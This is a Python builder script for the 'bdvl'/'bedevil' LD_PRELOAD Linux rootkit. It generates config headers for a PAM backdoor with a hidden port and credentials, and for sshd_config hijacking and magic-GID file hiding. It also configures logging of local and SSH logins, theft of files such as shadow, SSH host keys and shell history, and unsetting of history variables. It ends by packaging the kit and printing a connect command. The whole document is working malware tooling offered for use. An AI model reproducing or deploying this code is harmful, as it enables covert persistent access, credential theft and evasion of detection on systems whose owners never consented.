#!/usr/bin/env python


# SETTINGS

# by default the password & port are random values. you can change this.
BD_UNAME = 'changeme'
BD_PWD   = None
PAM_PORT = None


PATCH_SSHD_CONFIG = True # makes sure the PAM backdoor stays accessible by hijacking sshd_config.

READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
GID_CHANGE_MINTIME = 60 * 30
HIDE_MY_ASS      = True     # keep track of hidden things outside of the rootkit's directories. for rehiding upon a GID change.
CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when no rootkit processes are up.

LOG_LOCAL_AUTH = True   # log successful auths for users on the box.
LOG_SSH        = True   # log outgoing ssh login attempts.

# "steal" files that may be of interest. they will be updated if there are changes in size.
# wildcards for filenames work too..the files are stolen in the user's process so we're not modifying access times.
FILE_STEAL = True
MAX_FILE_SIZE      = (1024 * 1024) * 5   # don't try to steal files bigger than 5mb. set to None to disable limit. keep in mind memory is allocated for the target file.
CLEAN_STOLEN_FILES = True                # remove stolen files every `FILE_CLEANSE_TIMER` seconds.
FILE_CLEANSE_TIMER = (60 * 60) * 24      # remove stolen files once each day. you may want to change this depending on frequently you think files will be stolen & how big you think they could be.
INTERESTING_FILES  = ['passwd',                     'shadow',                 'sshd_config',
                      'ssh_config',                 'ssh_host_dsa_key',       'ssh_host_dsa_key.pub',
                      'ssh_host_ecdsa_key',         'ssh_host_ecdsa_key.pub', 'ssh_host_ed25519_key',
                      'ssh_host_ed25519_key.pub',   'ssh_host_rsa_key',       'ssh_host_rsa_key.pub',
                      'apache.log', 'known_hosts',  '.bash_history',
                      '*.txt', '*.sql',   '*.php', '*.zip',
                      '*.tar', '*.tar.*', '*.rar', '*.db']

USE_CRYPT = True


# END OF SETTINGS


# other random stuff

# bdvl will unset these environment variables in its processes.
unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND']





from crypt import crypt
from shutil import copytree, copy
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from os import listdir, system, unlink
from os.path import join, basename
from binascii import hexlify




class Util():
    def randgarb(self, garbset, garblen):
        garb = ''.join(choice(garbset) for _ in range(garblen))
        return garb

    def cryptpw(self, plain):
        salt = self.randgarb(ascii_uppercase+ascii_lowercase+digits, 16)
        hashd = crypt(plain, "$6$"+salt)
        return hashd

    def randpath(self, maxlen):
        rootdirs = ['/usr', '/etc', '/lib']
        randroot = choice(rootdirs)
        randdir = choice(listdir(randroot))

        while len(randdir) < maxlen:
            randdir += self.randgarb(ascii_lowercase, 1)

        while len(randdir) > maxlen:
            randdir = randdir[:-1]

        suffix = self.randgarb(ascii_lowercase, 3)
        newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
        if newpath in USED_PATHS or '.' in newpath:
            newpath = self.randpath(maxlen)
        USED_PATHS.append(newpath)
        return newpath

    def randpaths(self, count):
        allpaths = []
        for i in range(count):
            maxlen = choice(range(2, 5))
            allpaths.append(self.randpath())
        return allpaths


class Definitions():
    def __init__(self, alist):
        self.array_list = alist
        self.list_len = len(alist)

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, val)
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # creates a bunch of string definitions based on data
    # in target array. not used & not needed, but kept.
    def getdefs(self):
        all_defs = ''
        for i in range(self.list_len):
            our_name = self.array_list[i][0]
            our_value = self.array_list[i][1]

            this_def = self.gettcdef(our_name, our_value)
            all_defs += this_def
        return all_defs

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        rlnam = nam.upper()
        ident = '#define C{0} {1}\n'
        ident = ident.format(rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    def getidents(self):
        idents = ''
        for i in range(self.list_len):
            our_name = self.array_list[i]
            idents += self.getident(our_name, i)
        return idents


# handy class. trusty class. thank you class.
class CArray(): # default is assumed to be an array of char pointers
    def __init__(self, name, alist, arrtype='charp'):
        self.array_name = name
        self.size_name = name.upper() + '_SIZE'
        self.list_len = len(alist)
        self.array_list = alist
        self.arrtype = arrtype

    # define size of the array to be created.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.size_name, self.list_len)
        return size_def

    # setup the beginning of the array.
    def declarecharparray(self):
        declaration = 'static char *const {0}[{1}] = '
        declaration = declaration.format(self.array_name, self.size_name)
        return declaration

    def declarechararray(self):
        declaration = 'static char const {0}[{1}] = '
        declaration = declaration.format(self.array_name, self.size_name)
        return declaration

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.array_list:
            if self.arrtype == 'charp':
                elems += '"{0}",'.format(elem)
            else:
                elems += '{0},'.format(elem)
        elems = elems[:-1]  # remove trailing comma.
        elems += '};\n'
        return elems

    # create full C array.
    def create(self):
        result = self.getsizedef()
        if self.arrtype == 'charp':
            result += self.declarecharparray()
        elif self.arrtype == 'char':
            result += self.declarechararray()
        result += self.buildelems()
        return result


# 'random' paths we've already got.
USED_PATHS = []
# stores all names of hooked funcs
ALL_HOOKS = []

# bunch of settings related stuff...
ut = Util()

if BD_UNAME == None:
    BD_UNAME = ut.randgarb(ascii_lowercase, 7)
if BD_PWD == None:
    BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 8)
if PAM_PORT == None:
    PAM_PORT = choice(range(11111, 63556))

print('Username: ' + BD_UNAME)
print('Password: ' + BD_PWD)
print('Hidden port: ' + str(PAM_PORT))

MAGIC_GID = choice(range(22222222, 66666666))

INSTALL_DIR = ut.randpath(7)
HOMEDIR = ut.randpath(7)
BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)

CLEANEDTIME_PATH = ut.randpath(7)
if CLEAN_STOLEN_FILES == False or FILE_CLEANSE_TIMER == None:
    CLEANEDTIME_PATH = None

INC      = 'inc'
NEW_INC  = 'new_inc'
CONFIGH      = NEW_INC + '/config.h'
HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads stuff from here to install the kit.

BDVLH = NEW_INC + '/bedevil.h'
SETTINGS = { # all of these are written to bedevil.h
    'BD_UNAME':BD_UNAME,                  'BD_PWD':ut.cryptpw(BD_PWD),
    'MAGIC_GID':int(MAGIC_GID),           'BD_VAR':ut.randgarb(ascii_uppercase, 9),
    'INSTALL_DIR':INSTALL_DIR,            'HOMEDIR':HOMEDIR,
    'BDVLSO':BDVLSO,                      'SOPATH':SOPATH,
    'PRELOAD_FILE':ut.randpath(10),       'SSH_LOGS':ut.randpath(7),
    'INTEREST_DIR':ut.randpath(7),        'HIDEPORTS':ut.randpath(7),
    'GID_PATH':ut.randpath(5),            'GIDTIME_PATH':ut.randpath(5),
    'PAM_PORT':int(PAM_PORT),             'SSHD_CONFIG':'/etc/ssh/sshd_config',
    'LOG_PATH':ut.randpath(7),            'ASS_PATH':ut.randpath(7),
    'MAX_FILE_SIZE':MAX_FILE_SIZE,        'BASHRC_PATH':HOMEDIR+'/.bashrc',
    'PROFILE_PATH':HOMEDIR+'/.profile',   'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
    'CLEANEDTIME_PATH':CLEANEDTIME_PATH
}

# the following paths are linked to within the installation directory.
# & removed when we aren't logged into the box.
LINKPATHS = {
    SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
    SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
    SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir'
}

# these must be checked & based on the values, subsequently written to config.h
# so that the kit knows what stuff to do & what not to do.
CHECKTHESE = {
    'PATCH_SSHD_CONFIG':PATCH_SSHD_CONFIG,   'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,     'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
    'HIDE_MY_ASS':HIDE_MY_ASS,               'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
    'LOG_SSH':LOG_SSH,                       'FILE_STEAL':FILE_STEAL,
    'USE_CRYPT':USE_CRYPT,                   'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,
    'CLEAN_STOLEN_FILES':CLEAN_STOLEN_FILES
}

TOGGLE_PATHS = {  # there are paths that go along with said toggles. they're needed.
    SETTINGS['SSH_LOGS']:LOG_SSH,
    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
    SETTINGS['LOG_PATH']:LOG_LOCAL_AUTH,
    SETTINGS['ASS_PATH']:HIDE_MY_ASS,
    SETTINGS['INTEREST_DIR']:FILE_STEAL,
    SETTINGS['CLEANEDTIME_PATH']:CLEANEDTIME_PATH
}

NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
    '/proc':True,
    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
    SETTINGS['INSTALL_DIR']:True,
    SETTINGS['PRELOAD_FILE']:True,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
    SETTINGS['HIDEPORTS']:True,
    SETTINGS['SSH_LOGS']:LOG_SSH,
    SETTINGS['INTEREST_DIR']:FILE_STEAL,
    SETTINGS['HOMEDIR']:True,
    SETTINGS['ASS_PATH']:True,
    SETTINGS['CLEANEDTIME_PATH']:True
}

# read the list of hooked function names from libdl directory &
# create C arrays for them where the contents are referenced by
# the hook() & call() macro wrappers & their functions defined
# in libdl.h.
def gethooks():
    fd = open(HOOKS_PATH, 'r')
    contents = fd.read().split('\n')
    fd.close()

    allhooks = ''
    for line in contents:
        # empty lines or comment lines are of no interest to us.
        if len(line) == 0 or line[0] == '#':
            continue

        # libname:hook1,hook2,hook3,hook4...
        curtoks = line.split(':')
        
        targetlib = curtoks[0]
        targetsyms = curtoks[1]

        # divide all hooked function names into one list.
        hooktoks = targetsyms.split(',')

        # add all of the hooked function names from the current target library into a list for all.
        for curhook in hooktoks:
            ALL_HOOKS.append(curhook)

        # create the C array for the current target lib & the hooked functions
        newarr = CArray(targetlib, hooktoks)
        allhooks += newarr.create()

    return allhooks


def setupcfg():
    # these are settings that auto.sh must be able to read & use to install the kit.
    targets = ['MAGIC_GID', 'INSTALL_DIR', 'HOMEDIR', 'PRELOAD_FILE', 'BDVLSO',
               'SOPATH', 'HIDEPORTS', 'SSH_LOGS', 'INTEREST_DIR',
               'BD_VAR', 'GID_PATH', 'GIDTIME_PATH', 'LOG_PATH',
               'ASS_PATH']

    fd = open(SETTINGS_CFG, 'w')
    fd.write('\n'.join(str(SETTINGS[target]) for target in targets))
    fd.close()

def checktoggles(keys, values):
    count = len(keys)
    okhere = ''
    for i in range(count):
        if values[i] == True:
            okhere += '#define {0}\n'.format(keys[i])
    return okhere

# hex the contents of a path & return it as a char array.
def hexarraylifypath(path, arrname, sizedef):
    fd = open(path, 'rb')
    contents = fd.read()
    fd.close()

    contentshex = hexlify(contents)
    contentslist = ['0x' + contentshex[i:i+2] for i in range(0, len(contentshex), 2)]
    contentsarr = CArray(arrname, contentslist, arrtype='char')
    return contentsarr.create()

def listconditional(dictlist):
    keys   = list(dictlist.keys())
    values = list(dictlist.values())

    goodkeys = []
    for i in range(len(keys)):
        if values[i] == False:
            continue
        goodkeys.append(keys[i])
    return goodkeys

def setup_config():
    copytree(INC, NEW_INC)

    # determine the status of stuff & define it if needed
    KEYS = list(CHECKTHESE.keys())
    VALUES = list(CHECKTHESE.values())
    configh = checktoggles(KEYS, VALUES)
    if AUTO_GID_CHANGER == True:
        configh += '#define GID_CHANGE_MINTIME {0}\n'
        configh = configh.format(GID_CHANGE_MINTIME)
    fd = open(CONFIGH, 'a')
    fd.write(configh)
    fd.close()

    # write all settings & values to bedevil.h
    KEYS   = list(SETTINGS.keys())
    VALUES = list(SETTINGS.values())
    gotbdvlh = gethooks()

    for settingi in range(len(SETTINGS)):
        target = KEYS[settingi]
        value = VALUES[settingi]

        skip = False
        togpathkeys = list(TOGGLE_PATHS.keys())
        togpathvals = list(TOGGLE_PATHS.values())
        for key in togpathkeys:
            if value == key and TOGGLE_PATHS[key] == False:
                skip = True
                break

        if value == None or skip == True:
            continue

        # if the target setting is a port, add it into the hideports file.
        targettok = target.split('_')
        if 'PORT' in targettok:
            fd = open(NEW_INC+'/hideports', 'a')
            fd.write(str(value)+'\n')
            fd.close()                

        try:
            gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
        except:
            gotbdvlh += '#define {0} {1}\n'.format(target, str(value))

    defs = Definitions(ALL_HOOKS)
    gotbdvlh += defs.getidents()

    allhooksarr = CArray('all', ALL_HOOKS)
    gotbdvlh += allhooksarr.create()
    gotbdvlh += 'syms symbols[ALL_SIZE];\n'

    fd = open('etc/.rolf', 'r')
    rolf = fd.read().strip().split('\n')
    fd.close()
    rolfarr = CArray('rolfs', rolf)
    gotbdvlh += rolfarr.create()

    if FILE_STEAL == True:
        bashrcarr = CArray('interesting_files', INTERESTING_FILES)
        gotbdvlh += bashrcarr.create()

    alllinksrcs = []
    KEYS = list(LINKPATHS.keys())
    VALUES = list(LINKPATHS.values())
    for i in range(len(KEYS)):
        thislinkpath = '{0}:{1}'.format(KEYS[i], SETTINGS['HOMEDIR']+'/'+VALUES[i])
        alllinksrcs.append(thislinkpath)

    linksrc  = []
    linkdest = []
    for link in alllinksrcs:
        link = link.split(':')
        linksrc.append(link[0])
        linkdest.append(link[1])
    linksrcs = CArray('linksrcs', linksrc)
    linkdests = CArray('linkdests', linkdest)
    gotbdvlh += linksrcs.create() + linkdests.create()

    #unset_variables
    arrunsetvars = CArray('unsetvars', unsetvars)
    gotbdvlh += arrunsetvars.create()

    togpathslist = listconditional(TOGGLE_PATHS)
    arrtogpaths = CArray('togpaths', togpathslist)
    gotbdvlh += arrtogpaths.create()

    notracklist = listconditional(NOTRACK)
    arrnotrack = CArray('notrack', notracklist)
    gotbdvlh += arrnotrack.create()

    # bedevil.h complete. write it.
    fd = open(BDVLH, 'w')
    fd.write(gotbdvlh)
    fd.close()

    # write all the settings auto.sh needs.
    setupcfg()

    # mk tar.gz of include dir. b64 it. rm it.
    system('tar cpfz {0}.tar.gz {1}'.format(BD_UNAME, NEW_INC))
    fd = open(BD_UNAME+'.tar.gz', 'rb')
    targzb64 = b64encode(fd.read())
    fd.close()
    unlink(BD_UNAME+'.tar.gz')
    
    # write b64.
    fd = open(BD_UNAME+'.b64', 'wb')
    fd.write(targzb64)
    fd.close()




if __name__ == '__main__':
    setup_config()
    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), BD_PWD)
    print('\n\t\033[1;31m{0}\033[0m\n'.format(template))

